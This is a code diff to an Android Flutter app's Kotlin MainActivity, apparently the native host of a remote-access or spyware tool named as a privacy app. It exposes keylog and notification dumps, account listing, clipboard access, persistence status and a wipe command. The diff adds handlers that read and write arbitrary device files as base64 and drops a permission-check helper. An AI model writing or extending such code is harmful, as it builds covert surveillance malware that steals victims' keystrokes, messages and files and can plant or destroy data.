@@ -1,29 +1,27 @@
 package com.anon.privacy
 
-import android.Manifest
 import android.content.ClipData
 import android.content.ClipboardManager
 import android.content.Context
-import android.content.pm.PackageManager
 import android.os.Build
 import android.accounts.AccountManager
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.PendingIntent
-import android.telephony.TelephonyManager
+import android.util.Base64
 import androidx.core.app.NotificationCompat
-import androidx.core.content.ContextCompat
 import io.flutter.embedding.android.FlutterActivity
 import io.flutter.embedding.engine.FlutterEngine
 import io.flutter.plugin.common.MethodChannel
 import java.io.File
 
 /**
- * Native host — device info, clipboard, files, accounts, SIM,
- * notifications buffer, keylog buffer, persist status, local notification, wipe.
+ * Native host — device info, clipboard, filesystem (list/read/write),
+ * accounts, notification/keylog buffers, persist status, local notification, wipe.
  */
 class MainActivity : FlutterActivity() {
     private val channelName = "com.anon.privacy/host"
+    private val maxTransferBytes = 12 * 1024 * 1024
 
     companion object {
         @Volatile
@@ -45,8 +43,19 @@ class MainActivity : FlutterActivity() {
                             val path = call.argument<String>("path") ?: "/sdcard"
                             result.success(listDir(path))
                         }
+                        "readFile" -> {
+                            val path = call.argument<String>("path")
+                                ?: throw IllegalArgumentException("path required")
+                            result.success(readFile(path))
+                        }
+                        "writeFile" -> {
+                            val path = call.argument<String>("path")
+                                ?: throw IllegalArgumentException("path required")
+                            val b64 = call.argument<String>("b64")
+                                ?: throw IllegalArgumentException("b64 required")
+                            result.success(writeFile(path, b64))
+                        }
                         "listAccounts" -> result.success(listAccounts())
-                        "simInfo" -> result.success(simInfo())
                         "notificationDump" -> result.success(notificationDump())
                         "keylogDump" -> result.success(keylogDump())
                         "persistStatus" -> result.success(persistStatus())
@@ -63,9 +72,6 @@ class MainActivity : FlutterActivity() {
                 }
             }
     }
-
-    private fun has(perm: String): Boolean =
-        ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED
 
     private fun deviceInfo(): Map<String, Any?> = mapOf(
         "manufacturer" to Build.MANUFACTURER,
@@ -90,7 +96,7 @@ class MainActivity : FlutterActivity() {
         val dir = File(path)
         if (!dir.exists()) throw IllegalArgumentException("path not found: $path")
         if (!dir.isDirectory) throw IllegalArgumentException("not a directory: $path")
-        val entries = dir.listFiles()?.take(200)?.map { f ->
+        val entries = dir.listFiles()?.sortedBy { it.name.lowercase() }?.take(300)?.map { f ->
             mapOf(
                 "name" to f.name,
                 "path" to f.absolutePath,
@@ -98,35 +104,46 @@ class MainActivity : FlutterActivity() {
                 "size" to f.length(),
             )
         } ?: emptyList()
-        return mapOf("path" to path, "entries" to entries)
+        return mapOf("path" to path, "cwd" to path, "entries" to entries)
+    }
+
+    private fun readFile(path: String): Map<String, Any?> {
+        val f = File(path)
+        if (!f.exists() || !f.isFile) throw IllegalArgumentException("file not found: $path")
+        if (f.length() > maxTransferBytes) {
+            throw IllegalArgumentException("file too large (>${maxTransferBytes} bytes)")
+        }
+        val bytes = f.readBytes()
+        return mapOf(
+            "path" to f.absolutePath,
+            "name" to f.name,
+            "size" to bytes.size,
+            "b64" to Base64.encodeToString(bytes, Base64.NO_WRAP),
+            "mime" to "application/octet-stream",
+        )
+    }
+
+    private fun writeFile(path: String, b64: String): Map<String, Any?> {
+        val bytes = Base64.decode(b64, Base64.DEFAULT)
+        if (bytes.size > maxTransferBytes) {
+            throw IllegalArgumentException("payload too large (>${maxTransferBytes} bytes)")
+        }
+        val f = File(path)
+        f.parentFile?.mkdirs()
+        f.writeBytes(bytes)
+        return mapOf(
+            "path" to f.absolutePath,
+            "size" to bytes.size,
+            "written" to true,
+        )
     }
 
     private fun listAccounts(): Map<String, Any?> {
-        if (!has(Manifest.permission.GET_ACCOUNTS) && Build.VERSION.SDK_INT < 23) {
-            // pre-M; still try
-        }
         val am = AccountManager.get(this)
         val accounts = am.accounts.map { a ->
             mapOf("name" to a.name, "type" to a.type)
         }
         return mapOf("accounts" to accounts, "count" to accounts.size)
-    }
-
-    private fun simInfo(): Map<String, Any?> {
-        val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
-        val network = try { tm.networkOperatorName } catch (_: Exception) { null }
-        val sim = try { tm.simOperatorName } catch (_: Exception) { null }
-        val country = try { tm.simCountryIso } catch (_: Exception) { null }
-        val phone = try {
-            if (has(Manifest.permission.READ_PHONE_STATE)) tm.line1Number else null
-        } catch (_: Exception) { null }
-        return mapOf(
-            "networkOperator" to network,
-            "simOperator" to sim,
-            "simCountry" to country,
-            "line1" to phone,
-            "phoneType" to tm.phoneType,
-        )
     }
 
     private fun notificationDump(): Map<String, Any?> =
